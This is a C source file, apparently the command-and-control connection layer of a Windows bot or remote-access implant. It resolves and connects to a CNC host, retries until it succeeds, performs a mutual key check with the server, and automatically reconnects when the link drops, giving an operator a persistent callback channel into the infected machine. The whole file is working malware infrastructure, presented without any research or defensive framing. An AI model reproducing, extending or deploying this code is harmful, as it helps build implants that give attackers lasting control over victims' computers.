#define _WIN32_WINNT 0x0501

#include <windows.h>
#include <winsock2.h>
#include <ws2tcpip.h>
#include <stdio.h>
#include "cnc.h"
#include "utils.h"
#include "logger.h"

SOCKET cnc_sock = INVALID_SOCKET;
char *cnc_host = NULL;

void init_winsock()
{
    WSADATA wsaData = {};
    int ret = 0;

    ret = WSAStartup(MAKEWORD(2, 2), &wsaData);
    if (ret != 0)
        fatal_error("WSAStartup failed: %d", ret);
    log_debug("Initialized Winsock.");
}

void get_cnc_addrinfo(struct addrinfo **result)
{
    int ret = 0;
    char cnc_addr[255];
    long unsigned int cnc_addr_len = sizeof(cnc_addr);
    struct addrinfo *cnc_addrinfo, hints = {.ai_family = AF_INET, .ai_socktype = SOCK_STREAM, .ai_protocol = IPPROTO_TCP};

    ret = getaddrinfo(cnc_host, CNC_PORT, &hints, result);
    if (ret != 0)
        fatal_error("getaddrinfo failed: %d", ret);

    cnc_addrinfo = *result;
    WSAAddressToStringA(cnc_addrinfo->ai_addr, cnc_addrinfo->ai_addrlen, NULL, cnc_addr, &cnc_addr_len);
    log_debug("CNC's address: %s", cnc_addr);
}

void init_cnc_sock()
{
    cnc_sock = socket(AF_INET, SOCK_STREAM, 0);

    if (cnc_sock == INVALID_SOCKET)
        fatal_error("Error at socket(): %ld", WSAGetLastError());
}

void auth_cnc()
{
    int byte_count = 0;
    char received_auth_key[AUTH_KEY_LEN];

    log_info("Authenticating with CNC.");
    byte_count = send_cnc(AUTH_KEY_TO_CNC, AUTH_KEY_LEN);
    if (byte_count != AUTH_KEY_LEN)
        fatal_error("Failed to send authentication key to CNC.");

    byte_count = recv_cnc(received_auth_key, AUTH_KEY_LEN);
    if (byte_count != AUTH_KEY_LEN || memcmp(received_auth_key, AUTH_KEY_FROM_CNC, AUTH_KEY_LEN))
        fatal_error("Received invalid authentication key from CNC.");
}

void connect_cnc(struct addrinfo *cnc_addrinfo)
{
    int ret = 0;

    while (TRUE)
    {
        ret = connect(cnc_sock, cnc_addrinfo->ai_addr, cnc_addrinfo->ai_addrlen);
        if (ret == SOCKET_ERROR)
        {
            ret = WSAGetLastError();
            if (ret != WSAECONNREFUSED)
                fatal_error("Error at connect(): %ld", ret);
            else
            {
                log_warning("Failed to connect to CNC. Retrying in %ds.", SLEEP_INTERVAL_ON_CONNREFUSED_MS / 1000);
                Sleep(SLEEP_INTERVAL_ON_CONNREFUSED_MS);
            }
        }
        else
        {
            auth_cnc();
            log_info("Connected to CNC.");
            return;
        }
    }
}

void reconnect_cnc()
{
    struct addrinfo *cnc_addrinfo = NULL;

    get_cnc_addrinfo(&cnc_addrinfo);
    init_cnc_sock();
    connect_cnc(cnc_addrinfo);
}

int send_cnc(void *buf, size_t len)
{
    int bytes_sent = 0;

    bytes_sent = send(cnc_sock, buf, len, 0);
    if (bytes_sent == SOCKET_ERROR)
        fatal_error("Error at send(): %ld", WSAGetLastError());

    return bytes_sent;
}

int _recv_cnc(void *buf, size_t len, int flags)
{
    int bytes_read = 0;

    bytes_read = recv(cnc_sock, buf, len, flags);
    if (bytes_read == SOCKET_ERROR)
        fatal_error("Error at recv(): %ld", WSAGetLastError());
    if (bytes_read == 0)
    {
        log_error("Connection with CNC broke.");
        reconnect_cnc();
    }
    return bytes_read;
}

int recv_cnc(void *buf, size_t len)
{
    return _recv_cnc(buf, len, 0);
}

int recvall_cnc(void *buf, size_t len)
{
    return _recv_cnc(buf, len, MSG_WAITALL);
}

void init_cnc_conn(char *host)
{
    struct addrinfo *cnc_addrinfo = NULL;

    cnc_host = host;
    init_winsock();
    get_cnc_addrinfo(&cnc_addrinfo);
    init_cnc_sock();
    connect_cnc(cnc_addrinfo);
}
